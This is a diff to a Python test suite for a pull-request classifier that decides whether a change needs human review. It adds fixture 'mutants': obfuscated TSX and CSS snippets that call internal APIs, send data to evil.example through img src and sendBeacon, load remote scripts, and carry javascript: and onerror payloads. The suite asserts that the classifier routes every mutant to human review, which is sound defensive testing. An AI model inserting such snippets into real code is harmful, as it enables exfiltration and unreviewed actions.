@@ -1,7 +1,10 @@
 #!/usr/bin/env python3
 """Fixture tests for scripts/autonomy_class.py and autonomy-class.yml (\u00a711 R1).
 
-Run:  python3 scripts/test_autonomy_class.py      (stdlib unittest, no deps)
+Run:  AUTONOMY_TS_DIR=<dir of typescript@5.9.3> python3 -m pytest scripts/test_autonomy_class.py
+      (stdlib unittest + node. The parser can also come from the repo's
+      node_modules after `pnpm install --frozen-lockfile`, or from
+      `autonomy_class.py install-parser`, which checks the lockfile hash.)
 
 Every case runs the REAL lists in .github/autonomy/ through the REAL
 classifier. Fixtures are REST-shaped PR bundles (what `collect` produces).
@@ -25,6 +28,13 @@ Structure:
   * ListParsing      — deny wins; malformed lists fail (and so post human).
   * CollectStub      — the REST half against a stub `gh`: tree modes, head
                        moved, any API failure or truncation -> human.
+  * ContentOnlyMutants — all 15 R1 + 30 R2 review mutants, each `human`
+                       head-only, over a plain base, and over a same-shape
+                       base with benign literals (R8 must name it).
+  * ContentOnly      — R8 itself: positive controls (JSX text, text attribute,
+                       prose constant, CSS colour -> `auto`), negative controls
+                       (same edit + new identifier/attribute/import -> human),
+                       literal position/value rules, parse errors, pinning.
   * WorkflowStatic   — the workflow file's security properties.
 """
 
@@ -78,6 +88,15 @@ def fe(filename, content=STYLE_TSX, status="modified", **kw):
             base64.b64encode(content).decode() if content is not None else None
         ),
     }
+    # R8 compares head with base. By default the base is the SAME bytes (no
+    # change at all), so these fixtures exercise R0-R7 on their own; the
+    # ContentOnly tests below pass a real base.
+    if status == "modified":
+        b = kw.pop("base", content)
+        d["base_type"] = kw.pop("base_type", "file")
+        d["base_content_b64"] = base64.b64encode(b).decode() if b is not None else None
+    else:
+        kw.pop("base", None)
     d.update(kw)
     return d
 
@@ -144,8 +163,10 @@ class PositiveControl(Base):
             )
         )
 
-    def test_added_and_renamed_within_allow_are_auto(self):
-        self.assertAuto(
+    def test_added_and_renamed_within_allow_are_human(self):
+        # Content-only needs a base version of the same path (R8), so an added
+        # or renamed file is never auto, even inside the allow list.
+        self.assertHuman(
             bundle(
                 fe("apps/web/src/components/play/New.tsx", status="added"),
                 fe(
@@ -153,7 +174,9 @@ class PositiveControl(Base):
                     status="renamed",
                     previous_filename="apps/web/src/components/play/A.tsx",
                 ),
-            )
+            ),
+            "R2 status 'added'",
+            "R2 status 'renamed'",
         )
 
     def test_safe_imports_are_auto(self):
@@ -999,6 +1022,7 @@ class CollectStub(Base):
     SHA = "a" * 40
     BASE = "d" * 40
     BLOB = "b" * 40
+    BBLOB = "9" * 40
     F = "apps/web/src/components/play/Pill.tsx"
 
     def _collect(self, routes, fail=()):
@@ -1030,8 +1054,32 @@ class CollectStub(Base):
             },
         }
 
-    def _routes(self, mode="100644", content=STYLE_TSX, files=None):
+    def _routes(
+        self,
+        mode="100644",
+        content=STYLE_TSX,
+        files=None,
+        base=None,
+        base_mode="100644",
+    ):
+        base = content if base is None else base
         return {
+            f"repos/o/r/git/trees/{self.BASE}": [
+                {
+                    "truncated": False,
+                    "tree": [
+                        {
+                            "path": self.F,
+                            "mode": base_mode,
+                            "sha": self.BBLOB,
+                            "type": "blob",
+                        }
+                    ],
+                }
+            ],
+            f"repos/o/r/git/blobs/{self.BBLOB}": [
+                {"encoding": "base64", "content": base64.b64encode(base).decode()}
+            ],
             "repos/o/r/pulls/7": [self._pr()],
             f"repos/o/r/compare/{self.BASE}...{self.SHA}": [
                 {
@@ -1073,6 +1121,37 @@ class CollectStub(Base):
 
     def test_collect_then_classify_auto(self):
         self.assertAuto(self._collect(self._routes()))
+
+    def test_collect_reads_base_and_head_for_content_only(self):
+        # R8 end to end through the REST shapes: a JSX text edit is auto; the
+        # same edit plus a new attribute is human; a missing / symlinked /
+        # unreadable base is human.
+        base = b"export const A = () => <p className='x'>Hello there</p>;\n"
+        text = b"export const A = () => <p className='x'>Hello again</p>;\n"
+        attr = b"export const A = () => <p className='x' id='y'>Hello again</p>;\n"
+        self.assertAuto(self._collect(self._routes(content=text, base=base)))
+        self.assertHuman(
+            self._collect(self._routes(content=attr, base=base)), "R8 code structure"
+        )
+        self.assertHuman(
+            self._collect(self._routes(content=text, base=base, base_mode="120000")),
+            "R8 base object is 'symlink'",
+        )
+        r = self._routes(content=text, base=base)
+        r[f"repos/o/r/git/trees/{self.BASE}"][0]["tree"] = []
+        self.assertHuman(self._collect(r), "R8 base object is 'missing'")
+        r = self._routes(content=text, base=base)
+        r[f"repos/o/r/git/trees/{self.BASE}"][0]["truncated"] = True
+        self.assertHuman(self._collect(r), "base git tree listing truncated")
+        for url in (
+            f"repos/o/r/git/trees/{self.BASE}",
+            f"repos/o/r/git/blobs/{self.BBLOB}",
+        ):
+            with self.subTest(url=url):
+                self.assertHuman(
+                    self._collect(self._routes(content=text, base=base), fail=[url]),
+                    "could not read",
+                )
 
     def test_imports_resolve_against_the_head_tree(self):
         ok = b"import { X } from '@/lib/play/types';\nexport const A = X;\n"
@@ -1147,6 +1226,441 @@ class CollectStub(Base):
         self.assertHuman(self._collect(r), "truncated")
 
 
+# -- 4b. review R2 mutants (PR351-R2-mutants.py), kept as permanent fixtures --
+# Round 2 found 17/30 of these `auto` under the regex design. Under the
+# content-only design every one is `human` three ways (see ContentOnlyMutants).
+R2_MUTANTS = {
+    "N1 frames[] alias of window -> fetch DELETE": 'export const A=()=>{ (frames as any)["fe"+"tch"]("/a"+"pi/library/x",{method:"DE"+"LETE"}); return null };\n',
+    "N2 parent[]/top[] alias -> fetch": 'export const A=()=>{ (top as any)["fe"+"tch"]("/a"+"pi/set-lists",{method:"POST",body:"{}"}); return null };\n',
+    "N3 [].constructor.constructor": 'export const A=()=>{ [][("constr"+"uctor") as any][("constr"+"uctor")]("return this")()["fe"+"tch"]("/a"+"pi/jobs/1/retry",{method:"POST"}); return null };\n',
+    "N4 img src string-concat 3rd-party URL": 'export const A=({t}:{t:string})=> <img src={"https:/"+"/evil.example/p?c="+t} alt="" />;\n',
+    "N5 react-dom preinit remote script": 'import { preinit } from "react-dom";\nexport const A=()=>{ preinit("https:/"+"/evil.example/x.js",{as:"script"}); return null };\n',
+    "N6 navigator[sendBeacon]": 'export const A=()=>{ (navigator as any)["send"+"Beacon"]("https:/"+"/evil.example", "x"); return null };\n',
+    "N7 location[href] to API GET": 'export const A=({id}:{id:string})=>{ (location as any)["href"] = "/a"+"pi/jobs/"+id+"/retry"; return null };\n',
+    "N8 next/link prefetch to /api via concat": 'import Link from "next/link";\nexport const A=()=> <Link prefetch href={"/a"+"pi/jobs/1/retry"}>x</Link>;\n',
+    "N9 dangerouslySetInnerHTML via computed spread key": 'export const A=({h}:{h:string})=> <div {...{["dangerously"+"SetInnerHTML"]:{__html:h}}} />;\n',
+    "N10 window.Worker + import.meta.url": 'export const A=()=>{ const W=(window as any).Worker; new W(new URL("./w.ts", import.meta.url)); return null };\n',
+    "N11 Object.assign(location,{href})": 'export const A=()=>{ Object.assign(location,{href:"/a"+"pi/jobs/1/retry"}); return null };\n',
+    "N12 barrel re-export via allowed component": 'import { RUN_HINT } from "@/components/play/SectionLoop";\nexport const A=()=> <p>{RUN_HINT}</p>;\n',
+    "N13 transitive: import allowed fetch component": 'import { SetListPicker } from "@/components/setlists/AddToSetList";\nexport const A=()=> <SetListPicker jobId="j" open onClose={()=>{}} />;\n',
+    "N14 server action via computed action key": 'export const A=({go}:{go:(f:FormData)=>Promise<void>})=>{ const p={["act"+"ion"]:go}; return <form {...p}><button>x</button></form> };\n',
+    "N15 json import": 'import d from "./data.json";\nexport const A=()=> <p>{String(d)}</p>;\n',
+    "N16 next/dynamic": 'import dynamic from "next/dynamic";\nexport const A=dynamic(()=>Promise.resolve(()=>null));\n',
+    "N17 import.meta.env": "export const A=()=> <p>{(import.meta as any).env.X}</p>;\n",
+    "N18 new Function": 'export const A=()=>{ new Function("x")(); return null };\n',
+    "N19 globalThis[fe+tch]": 'export const A=()=>{ (globalThis as any)["fe"+"tch"]("/a"); return null };\n',
+    "N20 window[location]": 'export const A=()=>{ (window as any)["location"]="/a"; return null };\n',
+}
+R2_CSS_MUTANTS = {
+    "N21 CSS hex-escaped //host in url()": '.a{background:url("\\2f\\2f evil.example/p.gif")}\n',
+    "N22 CSS @import escaped": '@import "\\2f\\2f evil.example/x.css";\n.a{color:red}\n',
+}
+PLAIN_TSX = b"export const A = () => <p className='x'>Hello there</p>;\n"
+PLAIN_CSS = b".a {\n  color: red;\n}\n"
+EVIL = "apps/web/src/components/x/Evil.tsx"
+EVIL_CSS = "apps/web/src/components/x/b.module.css"
+
+
+def benign(src: str) -> str:
+    """The same source with every double-quoted literal replaced by prose: a
+    base that has the mutant's exact SHAPE but harmless values. Head vs this
+    base differs in literals only, so R8 must refuse it on literal POSITION
+    or VALUE, not on structure."""
+    return re.sub(r'"[^"\n]*"', '"Hello world"', src)
+
+
+def head_only(filename, content, **kw):
+    """The review harness's bundle shape: no base version at all."""
+    d = fe(filename, content, **kw)
+    d.pop("base_content_b64", None)
+    d.pop("base_type", None)
+    return d
+
+
+class ContentOnlyMutants(Base):
+    """Every R1 (15) and R2 (30) mutant is human (plan R4), three ways:
+    head-only (as the harness sends), over a plain base (structure changed),
+    and over a same-shape base with benign literals (literal position/value)."""
+
+    def _three_ways(self, name, filename, src, plain):
+        with self.subTest(name=name, way="head-only"):
+            self.assertHuman(bundle(head_only(filename, src.encode())), "R8 base")
+        with self.subTest(name=name, way="plain base"):
+            self.assertHuman(bundle(fe(filename, src.encode(), base=plain)), "R8")
+        b = benign(src)
+        if b == src:
+            return  # no literal to vary (e.g. N17): base == head is no change
+        with self.subTest(name=name, way="same-shape base"):
+            v = self.assertHuman(bundle(fe(filename, src.encode(), base=b.encode())))
+            self.assertTrue(any(r.startswith("R8") for r in reasons(v)), reasons(v))
+
+    def test_r1_mutants(self):
+        for name, (src, _) in REVIEW_MUTANTS.items():
+            self._three_ways(name, EVIL, src, PLAIN_TSX)
+        self._three_ways(
+            "M15 css //host",
+            "apps/web/src/components/x/a.module.css",
+            ".a{background:url(//evil.example/p.gif)}\n",
+            PLAIN_CSS,
+        )
+        self.assertEqual(len(REVIEW_MUTANTS) + 1, 15)
+
+    def test_r2_code_mutants(self):
+        for name, src in R2_MUTANTS.items():
+            self._three_ways(name, EVIL, src, PLAIN_TSX)
+        for name, src in R2_CSS_MUTANTS.items():
+            self._three_ways(name, EVIL_CSS, src, PLAIN_CSS)
+
+    def test_r2_bundle_mutants(self):
+        ok = b"export const A=()=>null;\n"
+        cases = {
+            "N23 rename deny->allow": fe(
+                "apps/web/src/components/x/Plain.tsx",
+                ok,
+                status="renamed",
+                previous_filename="apps/web/src/lib/billing/x.tsx",
+            ),
+            "N24 symlink mode": fe(EVIL, ok, type="symlink"),
+            "N25 mode change status": fe(EVIL, ok, status="changed"),
+            "N27 truncated (no patch)": fe(EVIL, ok, patch=None),
+            "N28 homoglyph path": fe("apps/web/src/components/x/Evіl.tsx", ok),
+            "N29 case variant dir": fe("apps/web/src/Components/x/E.tsx", ok),
+        }
+        for name, f in cases.items():
+            with self.subTest(name=name):
+                self.assertHuman(bundle(f))
+        with self.subTest(name="N26 >300 / partial list"):
+            self.assertHuman(bundle(fe(EVIL, ok), changed_files=301), "partial")
+        with self.subTest(name="N30 base_ref not v3/main"):
+            self.assertHuman(bundle(fe(EVIL, ok), base_ref="x"), "R0 base branch")
+        self.assertEqual(len(R2_MUTANTS) + len(R2_CSS_MUTANTS) + len(cases) + 2, 30)
+
+
+class ContentOnly(Base):
+    """R8: base vs head, parsed. Positive controls first (non-vacuity), then
+    negative controls (the same literal edit plus one structural change)."""
+
+    C = "apps/web/src/components/play/Pill.tsx"
+    CSS = "apps/web/src/components/play/Pill.module.css"
+    BASE = (
+        b"import { useState } from 'react';\n\n"
+        b"const HINT = 'Tap a stem to hear it';\n\n"
+        b"export function Pill({ label }: { label: string }) {\n"
+        b"  const [on] = useState(false);\n"
+        b"  return (\n"
+        b'    <span className="row" title="Stem pill">\n'
+        b"      Now playing {label} {on ? 'loud' : 'soft'} {HINT}\n"
+        b"    </span>\n"
+        b"  );\n"
+        b"}\n"
+    )
+
+    def edit(self, *pairs, src=None):
+        out = self.BASE if src is None else src
+        for a, b in pairs:
+            self.assertIn(a, out)
+            out = out.replace(a, b, 1)
+        return out
+
+    def tsx(self, head, base=None):
+        return bundle(fe(self.C, head, base=self.BASE if base is None else base))
+
+    # ---- positive controls: auto ------------------------------------------
+    def test_jsx_text_change_is_auto(self):
+        self.assertAuto(self.tsx(self.edit((b"Now playing", b"Playing now"))))
+
+    def test_text_attribute_and_class_change_is_auto(self):
+        self.assertAuto(
+            self.tsx(
+                self.edit((b'"Stem pill"', b'"Part pill"'), (b'"row"', b'"row wide"'))
+            )
+        )
+
+    def test_jsx_child_string_and_prose_constant_change_is_auto(self):
+        self.assertAuto(
+            self.tsx(
+                self.edit(
+                    (b"'loud'", b"'louder'"),
+                    (b"'Tap a stem to hear it'", b"'Tap any stem to hear it'"),
+                )
+            )
+        )
+
+    def test_whitespace_only_reformat_is_auto(self):
+        self.assertAuto(
+            self.tsx(
+                self.edit(
+                    (
+                        b"const [on] = useState(false);",
+                        b"const [on]  =  useState(false) ;",
+                    )
+                )
+            )
+        )
+
+    def test_css_colour_change_is_auto(self):
+        base = b".row {\n  color: #222;\n  gap: 12px;\n}\n"
+        head = b".row {\n  color: #444;\n  gap: 14px;\n}\n"
+        self.assertAuto(bundle(fe(self.CSS, head, base=base)))
+
+    def test_real_component_text_and_css_edits_are_auto(self):
+        p = "apps/web/src/components/play/Mixer.tsx"
+        css = "apps/web/src/components/play/Mixer.module.css"
+        src = real(p)
+        self.assertIn(b"M mute \xc2\xb7 S solo", src)
+        head = src.replace(b"M mute \xc2\xb7 S solo", b"M mutes \xc2\xb7 S solos", 1)
+        csrc = real(css).decode()
+        old = "color: var(--text-primary);"
+        self.assertIn(old, csrc)
+        chead = csrc.replace(old, "color: var(--text-secondary);", 1)
+        self.assertAuto(
+            bundle(fe(p, head, base=src), fe(css, chead.encode(), base=csrc.encode()))
+        )
+
+    def test_design_note_text_change_is_auto(self):
+        self.assertAuto(
+            bundle(
+                fe(
+                    "docs/design/nav.md",
+                    b"# Nav\n\nWrap at 380px.\n",
+                    base=b"# Nav\n\nWrap at 360px.\n",
+                )
+            )
+        )
+
+    # ---- negative controls: same literal edit + one structural change -----
+    def test_literal_edit_plus_structure_is_human(self):
+        t = (b"Now playing", b"Playing now")
+        cases = {
+            "new identifier": (b"{HINT}", b"{HINT}{label}"),
+            "new attribute": (b'title="Stem pill"', b'title="Stem pill" id="p"'),
+            "new import": (b"import { useState }", b"import { useState, useId }"),
+            "new import line": (b"import {", b"import 'x';\nimport {"),
+            "new call": (b"useState(false)", b"useState(Boolean(false))"),
+            "renamed member": (b"const [on]", b"const [off]"),
+            "number": (b"useState(false)", b"useState(0)"),
+            "const to let": (b"const HINT", b"let HINT"),
+            "comment": (b"  return (", b"  // eslint-disable-next-line\n  return ("),
+            "new spread": (b"<span className", b"<span {...{}} className"),
+            "new element": (b"{HINT}", b"{HINT}<b>x</b>"),
+        }
+        for name, extra in cases.items():
+            with self.subTest(name=name):
+                self.assertHuman(self.tsx(self.edit(t, extra)), "R8 code structure")
+
+    def test_css_value_edit_plus_structure_is_human(self):
+        base = b".row {\n  color: #222;\n}\n"
+        for name, head, why in (
+            (
+                "new property",
+                b".row {\n  color: #444;\n  position: fixed;\n}\n",
+                "CSS structure",
+            ),
+            ("new selector", b".row, .x {\n  color: #444;\n}\n", "CSS structure"),
+            (
+                "new at-rule",
+                b"@import 'x.css';\n.row {\n  color: #444;\n}\n",
+                "CSS structure",
+            ),
+            ("comment", b".row {\n  /* x */ color: #444;\n}\n", "CSS structure"),
+            (
+                "url value",
+                b".row {\n  color: #444;\n  background: url(x.png);\n}\n",
+                "CSS structure",
+            ),
+            ("url swap", None, "url"),
+            ("backslash", b".row {\n  color: \\23 444;\n}\n", "backslash"),
+            ("unbalanced", b".row {\n  color: #444;\n", "unbalanced"),
+        ):
+            with self.subTest(name=name):
+                if head is None:
+                    b0 = b".row {\n  background: url(a.png);\n}\n"
+                    h0 = b".row {\n  background: url(b.png);\n}\n"
+                    self.assertHuman(bundle(fe(self.CSS, h0, base=b0)), why)
+                else:
+                    self.assertHuman(bundle(fe(self.CSS, head, base=base)), why)
+
+    # ---- literal position and value rules ---------------------------------
+    def test_literal_in_non_content_position_is_human(self):
+        cases = {
+            "href": (
+                b"<a href='/a'>Hi there</a>",
+                b"<a href='/b'>Hi there</a>",
+                "attribute 'href'",
+            ),
+            "src": (
+                b"<img src='a.png' alt='x y' />",
+                b"<img src='b.png' alt='x y' />",
+                "attribute 'src'",
+            ),
+            "action": (
+                b"<form action='a b'><i>x</i></form>",
+                b"<form action='c d'><i>x</i></form>",
+                "attribute 'action'",
+            ),
+            "call argument": (
+                b"<p>{f('a b')}</p>",
+                b"<p>{f('c d')}</p>",
+                "call argument",
+            ),
+            "member key": (b"<p>{o['a b']}</p>", b"<p>{o['c d']}</p>", "member key"),
+            "computed key": (
+                b"<p>{({['a b']: 1})}</p>",
+                b"<p>{({['c d']: 1})}</p>",
+                "computed key",
+            ),
+            "comparison": (
+                b"<p>{x === 'a b' ? 1 : 2}</p>",
+                b"<p>{x === 'c d' ? 1 : 2}</p>",
+                "non-content position",
+            ),
+            "tagged template": (
+                b"<p>{t`a b`}</p>",
+                b"<p>{t`c d`}</p>",
+                "tagged template",
+            ),
+            "style element": (
+                b"<style>{'a b'}</style>",
+                b"<style>{'c d'}</style>",
+                "raw-text element",
+            ),
+            "Script component": (
+                b"<Script>{'a b'}</Script>",
+                b"<Script>{'c d'}</Script>",
+                "raw-text element",
+            ),
+            "spread html key": (
+                b"<div dangerouslySetInnerHTML={{ __html: 'a b' }} />",
+                b"<div dangerouslySetInnerHTML={{ __html: 'c d' }} />",
+                "changed value of '__html'",
+            ),
+        }
+        for name, (b0, h0, why) in cases.items():
+            with self.subTest(name=name):
+                base = (
+                    b"export const A = (x: any, o: any, f: any, t: any) => "
+                    + b0
+                    + b";\n"
+                )
+                head = (
+                    b"export const A = (x: any, o: any, f: any, t: any) => "
+                    + h0
+                    + b";\n"
+                )
+                self.assertHuman(bundle(fe(self.C, head, base=base)), why)
+
+    def test_directive_import_and_type_literals_are_human(self):
+        cases = (
+            (
+                b"'use client';\nexport const A = 1;\n",
+                b"'use server';\nexport const A = 1;\n",
+                "non-content position",
+            ),
+            (
+                b"import x from 'a';\nexport const A = x;\n",
+                b"import x from 'b';\nexport const A = x;\n",
+                "import/export",
+            ),
+            (b"export type T = 'a b';\n", b"export type T = 'c d';\n", "type position"),
+            (
+                b"export const A = (p: any) => p['a b'];\n",
+                b"export const A = (p: any) => p['c d'];\n",
+                "member key",
+            ),
+        )
+        for base, head, why in cases:
+            with self.subTest(head=head):
+                self.assertHuman(bundle(fe(self.C, head, base=base)), why)
+
+    def test_literal_values_that_are_not_content_are_human(self):
+        cases = {
+            "url in text attr": (b"'Stem pill'", b"'https://evil.example'", "URL/path"),
+            "path in child": (b"'loud'", b"'/api/jobs'", "URL/path"),
+            "protocol-relative": (b"'loud'", b"'//evil.example'", "URL/path"),
+            "domain": (b"'loud'", b"'see evil.example now'", "URL/path"),
+            "javascript scheme": (b"'loud'", b"'javascript:alert(1)'", "URL/path"),
+            "markup": (b"'loud'", b"'<img src=x onerror=y>'", "markup"),
+            "entity in JSX text": (b"Now playing", b"Now &lt;b&gt;", "markup"),
+            "empty": (b"'loud'", b"''", "empty"),
+            "constant without space": (
+                b"'Tap a stem to hear it'",
+                b"'fetch'",
+                "not prose",
+            ),
+            "constant relative path": (
+                b"'Tap a stem to hear it'",
+                b"'api/jobs/1 retry'",
+                "URL/selector punctuation",
+            ),
+        }
+        for name, (a, b, why) in cases.items():
+            with self.subTest(name=name):
+                head = self.edit(
+                    (a.replace(b"'", b'"') if a not in self.BASE else a, b)
+                )
+                self.assertHuman(self.tsx(head), why)
+
+    def test_sensitive_key_and_dynamic_file_constants_are_human(self):
+        base = b"export const O = { method: 'get it now' };\n"
+        head = b"export const O = { method: 'delete it now' };\n"
+        self.assertHuman(
+            bundle(fe(self.C, head, base=base)), "changed value of 'method'"
+        )
+        base = b"const K = 'a b c';\nexport const A = (o: any) => o[K];\n"
+        head = b"const K = 'd e f';\nexport const A = (o: any) => o[K];\n"
+        self.assertHuman(bundle(fe(self.C, head, base=base)), "computed member access")
+
+    def test_parse_errors_and_missing_parser_are_human(self):
+        bad = b"export const A = () => <p>;\n"
+        self.assertHuman(self.tsx(bad, base=bad), "R8 base: parse error")
+        self.assertHuman(self.tsx(self.BASE, base=bad), "R8 base: parse error")
+        self.assertHuman(self.tsx(bad), "R8 head: parse error")
+        old = os.environ.pop("AUTONOMY_TS_DIR", None)
+        try:
+            v = ac.classify(LISTS, self.tsx(self.BASE), ts_dir="/nonexistent")
+            if ac.find_typescript() is None:
+                self.assertEqual(v["verdict"], "human")
+                self.assertIn("parser not available", " ".join(reasons(v)))
+        finally:
+            if old is not None:
+                os.environ["AUTONOMY_TS_DIR"] = old
+
+    def test_missing_or_bad_base_is_human(self):
+        self.assertHuman(
+            bundle(fe(self.C, self.BASE, base=None)), "R8 base content not read"
+        )
+        self.assertHuman(
+            bundle(fe(self.C, self.BASE, base_type="symlink")),
+            "R8 base object is 'symlink'",
+        )
+        self.assertHuman(
+            bundle(fe(self.C, self.BASE, base=b"\xff\xfe")), "R8 base content"
+        )
+
+    def test_file_type_without_a_parser_is_human(self):
+        lists = ac.parse_lists(
+            "apps/web/src/components/**\n", "secrets/**\n", "react\n"
+        )
+        self.assertHuman(
+            bundle(fe("apps/web/src/components/x/a.json", b"{}\n", base=b"{ }\n")),
+            "no content-only parser",
+            lists=lists,
+        )
+
+    def test_parser_is_pinned_by_the_lockfile(self):
+        with open(os.path.join(ROOT, "pnpm-lock.yaml"), encoding="utf-8") as f:
+            want = ac.lockfile_integrity(f.read())
+        self.assertTrue(want.startswith("sha512-"))
+        with self.assertRaises(ac.ContentError):
+            ac.lockfile_integrity("lockfileVersion: '9.0'\n")
+        with tempfile.TemporaryDirectory() as d:
+            t = os.path.join(d, "t.tgz")
+            with open(t, "wb") as f:
+                f.write(b"not the real tarball")
+            with self.assertRaises(ac.ContentError):
+                ac.install_parser(os.path.join(ROOT, "pnpm-lock.yaml"), t, d)
+
+
 # -- 5. the workflow ----------------------------------------------------------
 class WorkflowStatic(unittest.TestCase):
     @classmethod
@@ -1209,7 +1723,19 @@ class WorkflowStatic(unittest.TestCase):
         self.assertIn("--lists .github/autonomy", self.code)
         self.assertIn('name: "autonomy-class"', self.code)
         self.assertIn("if: always()", self.code)
-        self.assertNotRegex(self.code, r"\b(npm|pnpm|yarn|pip)\b")
+        # No package manager runs (no install scripts); `pnpm-lock.yaml` is
+        # only READ, for the parser's pinned hash.
+        self.assertNotRegex(self.code, r"\b(npm|npx|pnpm|yarn|pip)\b(?![-.])")
+
+    def test_parser_is_hash_checked_before_use(self):
+        self.assertIn("install-parser", self.code)
+        self.assertIn("--lockfile pnpm-lock.yaml", self.code)
+        self.assertIn('--typescript "$RUNNER_TEMP/ts/package"', self.code)
+        self.assertLess(
+            self.code.index("install-parser"), self.code.index(" classify ")
+        )
+        # the tarball URL is built from the checker's constant, never PR data
+        self.assertIn("registry.npmjs.org/typescript/-/typescript-$ver.tgz", self.code)
         self.assertNotIn("labels", self.code)
         self.assertNotIn("/merge", self.code)
 
